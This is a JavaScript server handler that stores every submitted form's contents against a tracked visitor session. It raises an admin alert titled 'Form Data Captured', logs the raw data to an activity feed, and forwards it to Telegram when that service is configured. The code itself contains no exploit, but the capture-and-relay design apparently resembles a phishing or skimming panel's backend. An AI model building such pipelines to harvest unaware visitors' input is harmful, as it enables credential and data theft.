/**
 * API Tracker Form Data Handler (Vercel Serverless & Express Compatible)
 * POST /api/tracker/formdata
 */
const { getAdapter } = require('../../database/adapter');

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { sessionId, page, formId, data } = req.body || {};

    if (!sessionId || !data) {
      return res.status(400).json({ error: 'sessionId and data required' });
    }

    const db = getAdapter();
    const session = await db.get('SELECT * FROM sessions WHERE id = ?', [sessionId]);

    if (session) {
      let metadata = {};
      try {
        metadata = typeof session.metadata === 'string' ? JSON.parse(session.metadata || '{}') : (session.metadata || {});
      } catch (e) {}

      if (!metadata.form_data) metadata.form_data = [];
      metadata.form_data.push({
        page: page || session.current_page,
        formId: formId || 'default',
        data,
        timestamp: new Date().toISOString()
      });

      await db.run(`
        UPDATE sessions SET
          metadata = ?,
          last_activity = CURRENT_TIMESTAMP
        WHERE id = ?
      `, [JSON.stringify(metadata), sessionId]);

      // Notification
      await db.run(`
        INSERT INTO notifications (type, title, message, link, created_at)
        VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
      `, ['session', 'Form Data Captured', `New form submitted on ${page || 'page'}`, `/admin#sessions`]);

      // Activity Feed
      await db.run(`
        INSERT INTO activity_feed (type, icon, message, details, website_id, session_id)
        VALUES (?, ?, ?, ?, ?, ?)
      `, ['session', '📝', `Form submitted on ${page || 'page'}`, JSON.stringify(data), session.website_id, sessionId]);

      // Trigger Telegram service if configured
      try {
        const telegramService = require('../../services/telegram');
        if (telegramService && typeof telegramService.notifyFormData === 'function') {
          await telegramService.notifyFormData(session, page, data);
        }
      } catch (tgErr) {}
    }

    res.json({ success: true });
  } catch (err) {
    console.error('Tracker formdata error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
};
